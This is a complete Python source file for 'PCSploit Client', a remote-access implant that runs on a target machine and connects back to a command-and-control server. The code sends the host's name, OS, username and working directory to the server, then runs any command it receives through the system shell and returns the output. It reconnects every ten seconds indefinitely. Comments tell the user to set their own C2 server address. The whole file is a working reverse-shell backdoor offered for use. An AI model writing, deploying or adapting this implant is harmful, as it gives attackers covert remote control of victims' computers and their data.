"""
PCSploit Client
Runs on the TARGET machine. Connects back to the C2 server.
"""

import socket       # For network connections
import os           # For OS info (username, current directory)
import platform     # For system info (Windows/Linux/Mac)
import json         # For sending data as structured text
import time         # For waiting between reconnection attempts
import subprocess   # For running commands on the target


def get_system_info():
    """
    Collect information about the target machine to identify it.
    Returns a dictionary (key-value pairs).
    """
    info = {
        "hostname": socket.gethostname(),       # Computer name
        "platform": platform.system(),          # Windows, Linux, Darwin (macOS)
        "release": platform.release(),          # 10, 11, 22.04, etc.
        "version": platform.version(),          # Detailed version string
        "arch": platform.machine(),             # AMD64, ARM, etc.
        "username": os.environ.get("USERNAME")  # Windows
                    or os.environ.get("USER")   # Linux/Mac
                    or "unknown",
        "cwd": os.getcwd(),                     # Current working directory
        "pid": os.getpid(),                     # Process ID
    }
    return info


def execute_command(command):
    """
    Run a shell command on the target machine and return the result.
    
    Example commands:
        "whoami"       → returns the current username
        "ipconfig"     → returns network info (Windows)
        "ifconfig"     → returns network info (Linux/Mac)
        "dir"          → lists directory contents (Windows)
        "ls -la"       → lists directory contents (Linux/Mac)
    """
    try:
        # Run the command through the system shell
        # shell=True means it goes through cmd.exe or /bin/sh
        # capture_output=True captures stdout and stderr
        # timeout=60 means the command auto-kills after 60 seconds
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        
        # Return structured result
        return {
            "stdout": result.stdout,        # Normal output
            "stderr": result.stderr,        # Error output
            "returncode": result.returncode # 0 = success, non-zero = error
        }
        
    except subprocess.TimeoutExpired:
        return {"error": "Command timed out (60 seconds)"}
    except Exception as e:
        return {"error": str(e)}


def connect_to_server(server_ip, server_port):
    """
    Main loop: connects to the C2 server, sends system info,
    then waits for commands and sends back results.
    
    If the connection drops, it waits 10 seconds and tries again.
    This loop runs FOREVER until the process is killed.
    """
    while True:
        try:
            # Create a TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Timeout: if we can't connect within 30 seconds, give up
            sock.settimeout(30)
            
            # Connect to the C2 server
            sock.connect((server_ip, server_port))
            
            # Step 1: Send system info so the server knows who connected
            info = get_system_info()
            info_json = json.dumps(info) + "\n"
            sock.sendall(info_json.encode("utf-8"))
            
            # Step 2: Enter command loop
            while True:
                try:
                    # Set a short timeout so we can check for commands
                    # without blocking forever
                    sock.settimeout(5)
                    
                    # Wait for a command from the server
                    data = sock.recv(65536)  # 64KB max command size
                    
                    # If no data, connection is dead
                    if not data:
                        break
                    
                    # Decode the command
                    command = data.decode("utf-8").strip()
                    
                    # Handle special commands
                    if command.lower() == "exit":
                        # Server told us to disconnect
                        break
                    elif command.lower() == "ping":
                        # Server is checking if we're alive
                        sock.sendall(b"pong\n")
                    elif command.lower() == "info":
                        # Server wants updated system info
                        current_info = get_system_info()
                        sock.sendall(
                            json.dumps(current_info).encode("utf-8") + b"\n"
                        )
                    else:
                        # Everything else = a shell command to execute
                        result = execute_command(command)
                        output = json.dumps(result).encode("utf-8") + b"\n"
                        sock.sendall(output)
                        
                except socket.timeout:
                    # No command received within 5 seconds
                    # Send a keepalive (empty line) to keep connection open
                    try:
                        sock.sendall(b"\n")
                    except:
                        break
                except Exception:
                    # Something went wrong, break inner loop
                    break
            
            # Close the socket
            sock.close()
            
        except Exception:
            # Connection failed or broke — we'll try again
            pass
        
        # Wait 10 seconds before reconnecting
        # This prevents flooding the server with connection attempts
        time.sleep(10)


def main():
    """
    Entry point when the payload runs.
    CHANGE THESE VALUES to point to YOUR C2 server.
    """
    # ===== YOU MUST CHANGE THESE =====
    SERVER_IP = "127.0.0.1"      # ← Change to your C2 server's IP
    SERVER_PORT = 4443            # ← Change if you use a different port
    # =================================
    
    print(f"[*] PCSploit Client starting...")
    print(f"[*] Target server: {SERVER_IP}:{SERVER_PORT}")
    
    # Start the connection loop (runs forever)
    connect_to_server(SERVER_IP, SERVER_PORT)


if __name__ == "__main__":
    main()
